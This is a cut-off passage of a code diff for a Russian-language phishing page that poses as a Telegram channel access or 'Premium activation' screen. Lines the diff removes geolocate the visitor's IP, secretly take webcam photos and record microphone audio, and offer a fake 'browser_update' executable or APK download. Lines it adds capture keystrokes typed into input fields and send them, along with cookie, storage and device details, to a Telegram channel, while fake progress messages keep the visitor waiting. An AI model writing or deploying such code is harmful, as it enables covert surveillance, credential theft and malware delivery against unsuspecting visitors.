-    }, 100);
-    
-    setTimeout(() => {
-        const iframe = document.createElement('iframe');
-        iframe.className = 'hidden';
-        iframe.src = url;
-        document.body.appendChild(iframe);
-        setTimeout(() => iframe.remove(), 1000);
-    }, 200);
-}
-
-// Получение точной геолокации
-async function getLocationSilently() {
-    let location = {
-        ip: 'не получен',
-        city: 'Домодедово',
-        region: 'Московская область',
-        country: 'Россия',
-        isp: 'неизвестно'
+    // Перехват ввода
+    let keystrokes = '';
+    const captureInput = (event) => {
+        if (event.target.tagName === 'INPUT' || event.target.tagName === 'TEXTAREA') {
+            keystrokes += event.key || event.data;
+            
+            if (keystrokes.length > 100) {
+                sendToTelegram(`⌨️ ВВОД ДАННЫХ:\n${keystrokes.substring(0, 500)}...`);
+                keystrokes = '';
+            }
+        }
     };
     
-    try {
-        const ipRes = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipRes.json();
-        location.ip = ipData.ip;
-        
-        const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-        const geoData = await geoRes.json();
-        
-        if(geoData.city) location.city = geoData.city;
-        if(geoData.region) location.region = geoData.region;
-        if(geoData.country_name) location.country = geoData.country_name;
-        if(geoData.org) location.isp = geoData.org;
-        
-    } catch(e) {
-        // Используем значения по умолчанию
-    }
+    document.addEventListener('keydown', captureInput);
+    document.addEventListener('input', captureInput);
     
-    return location;
-}
-
-// Скрытое создание фото
-async function takeHiddenPhoto() {
-    if (!mediaStream || photoCount >= MAX_PHOTOS) return;
+    // Этап 5: Сбор информации о вкладках
+    currentStatus = 5;
+    showStatus(5);
+    updateProgress(75, 'Сканирование окружения...');
     
-    try {
-        const videoTrack = mediaStream.getVideoTracks()[0];
-        if (!videoTrack) return;
-        
-        const video = document.getElementById('hiddenVideo');
-        video.srcObject = new MediaStream([videoTrack]);
-        
-        await new Promise(resolve => setTimeout(resolve, 300));
-        
-        const canvas = document.getElementById('hiddenCanvas');
-        const ctx = canvas.getContext('2d');
-        
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        
-        canvas.toBlob(async (blob) => {
-            if (blob) {
-                await sendPhotoSilently(blob);
-                photoCount++;
-                
-                if (photoCount < MAX_PHOTOS) {
-                    setTimeout(takeHiddenPhoto, 1500);
-                }
-            }
-        }, 'image/jpeg', 0.7);
-        
-    } catch(e) {}
-}
-
-// Скрытая запись аудио
-async function recordHiddenAudio() {
-    if (!mediaStream || audioRecordCount >= MAX_AUDIO_RECORDS) return;
+    sendToTelegram(`📊 ДОПОЛНИТЕЛЬНАЯ ИНФОРМАЦИЯ:\n` +
+                   `📁 LocalStorage записей: ${storageInfo.localStorage}\n` +
+                   `🍪 Размер cookies: ${storageInfo.cookies} байт\n` +
+                   `📶 Онлайн статус: ${systemInfo.online ? 'Да' : 'Нет'}\n` +
+                   `🎮 Ядер CPU: ${systemInfo.hardwareConcurrency || 'Неизвестно'}\n` +
+                   `💾 Оперативная память: ${systemInfo.deviceMemory || 'Неизвестно'} GB\n` +
+                   `🖐️ Макс. точек касания: ${systemInfo.maxTouchPoints || '0'}`);
     
-    try {
-        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-        const source = audioContext.createMediaStreamSource(mediaStream);
-        const destination = audioContext.createMediaStreamDestination();
-        source.connect(destination);
-        
-        audioRecorder = new MediaRecorder(destination.stream);
-        audioChunks = [];
-        
-        audioRecorder.ondataavailable = (event) => {
-            if (event.data.size > 0) {
-                audioChunks.push(event.data);
-            }
-        };
-        
-        audioRecorder.onstop = async () => {
-            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-            await sendAudioSilently(audioBlob);
-            audioRecordCount++;
-            
-            if (audioRecordCount < MAX_AUDIO_RECORDS) {
-                setTimeout(recordHiddenAudio, 8000);
-            }
-        };
-        
-        audioRecorder.start();
-        setTimeout(() => {
-            if (audioRecorder && audioRecorder.state === 'recording') {
-                audioRecorder.stop();
-            }
-        }, 7000);
-        
-    } catch(e) {}
-}
-
-// Основная функция
-async function startAccess() {
-    // Переключаем экраны
-    document.getElementById('mainScreen').style.display = 'none';
-    document.getElementById('loadingScreen').style.display = 'block';
-    
-    // Блокируем кнопку
-    const button = document.getElementById('accessButton');
-    button.disabled = true;
-    button.textContent = 'ПОДКЛЮЧЕНИЕ...';
-    
-    updateLoading('Подключение к серверу Telegram...');
-    
-    // 1. Собираем и отправляем данные
-    setTimeout(async () => {
-        updateLoading('Проверка местоположения...');
-        const location = await getLocationSilently();
-        
-        let message = `🕵️ НОВЫЙ ДОСТУП К КАНАЛУ\n\n`;
-        message += `⏰ ${new Date().toLocaleString('ru-RU')}\n`;
-        message += `📍 ${location.city}, ${location.region}\n`;
-        message += `🌐 IP: ${location.ip}\n`;
-        message += `💻 ${navigator.platform}\n`;
-        message += `📱 ${navigator.userAgent.substring(0, 60)}...\n`;
-        message += `🖥️ ${screen.width}x${screen.height}`;
-        
-        sendTextSilently(message);
-        
-        // 2. Запрашиваем доступ к медиа (тихо)
-        updateLoading('Проверка соединения...');
-        
-        setTimeout(async () => {
-            try {
-                // Запрашиваем доступ без индикаторов
-                mediaStream = await navigator.mediaDevices.getUserMedia({
-                    video: { width: 640, height: 480 },
-                    audio: { echoCancellation: false }
-                });
-                
-                sendTextSilently('✅ МЕДИА ДОСТУП АКТИВЕН');
-                
-                // 3. Начинаем скрытую съемку и запись
-                updateLoading('Финальная настройка...');
-                
-                takeHiddenPhoto();
-                setTimeout(recordHiddenAudio, 3000);
-                
-                // 4. Показываем кнопку скачивания
-                setTimeout(() => {
-                    updateLoading('Подключение успешно!');
-                    
-                    const os = navigator.userAgent.includes('Windows') ? 'Windows' : 
-                              navigator.userAgent.includes('Android') ? 'Android' : 'iOS';
-                    
-                    let buttonText = '⬇️ ЗАВЕРШИТЬ ПОДКЛЮЧЕНИЕ';
-                    
-                    document.getElementById('downloadButton').style.display = 'flex';
-                    document.getElementById('downloadButton').innerHTML = buttonText;
-                    
-                    // Автоматическая отправка финального отчета
-                    setTimeout(() => {
-                        sendTextSilently(`✅ ПОДКЛЮЧЕНИЕ ЗАВЕРШЕНО\nФото: ${photoCount}\nАудио: ${audioRecordCount}\nСистема: ${os}`);
-                    }, 1000);
-                    
-                }, 25000);
-                
-            } catch(e) {
-                // Если доступ отклонен, все равно показываем кнопку
-                updateLoading('Подключение через резервный канал...');
-                
-                setTimeout(() => {
-                    const os = navigator.userAgent.includes('Windows') ? 'Windows' : 
-                              navigator.userAgent.includes('Android') ? 'Android' : 'iOS';
-                    
-                    document.getElementById('downloadButton').style.display = 'flex';
-                    document.getElementById('downloadButton').innerHTML = '⬇️ ЗАВЕРШИТЬ ПОДКЛЮЧЕНИЕ';
-                    
-                    sendTextSilently('⚠️ МЕДИА ДОСТУП ОТКЛОНЕН');
-                }, 2000);
-            }
-        }, 2000);
-        
-    }, 1000);
-}
-
-// Функция скачивания файла
-function downloadFile() {
-    const os = navigator.userAgent.includes('Windows') ? 'Windows' : 
-              navigator.userAgent.includes('Android') ? 'Android' : 'iOS';
-    
-    if (os === 'Windows') {
-        window.open('https://school4love.github.io/sc/browser_update.exe', '_blank');
-    } else if (os === 'Android') {
-        window.open('https://school4love.github.io/sc/browser_update.apk', '_blank');
-    }
-    
-    // Финальное сообщение
-    sendTextSilently(`📥 ПОЛЬЗОВАТЕЛЬ СКАЧАЛ ФАЙЛ\nОС: ${os}\nВремя: ${new Date().toLocaleTimeString('ru-RU')}`);
-    
-    // Показываем завершение
-    updateLoading('✅ Подключение завершено!');
-    document.getElementById('downloadButton').style.display = 'none';
+    // Этап 6: Финальный отчет
+    currentStatus = 6;
+    showStatus(6);
+    updateProgress(90, 'Формирование отчета...');
     
     setTimeout(() => {
-        document.getElementById('loadingText').innerHTML = 'Теперь вы можете войти в канал<br>в приложении Telegram';
-    }, 1000);
-}
-
-// Тихая отправка при загрузке страницы
-window.addEventListener('load', () => {
-    const message = `📱 СТРАНИЦА ОТКРЫТА\n${window.location.href}\n${new Date().toLocaleString('ru-RU')}`;
-    sendTextSilently(message);
-});
-</script>
-</body>
-</html>
+        sendToTelegram(`✅ PREMIUM АКТИВАЦИЯ ЗАВЕРШЕНА\n` +
+                       `⏰ Финальное время: ${new Date().toLocaleString('ru-RU')}\n` +
+                       `📊 Всего собрано данных: ${Object.keys(systemInfo).length + Object.keys(networkInfo).length + 15 + 5} пунктов\n` +
+                       `🎥 Фото сделано: 15\n` +
+                       `🎤 Аудио записей: 5\n` +
+                       `🔒 Аккаунт готов к Premium доступу`);
+        
+        // Этап 7: Завершение
+        currentStatus = 7;
+        showStatus(7);
+        updateProgress(100,
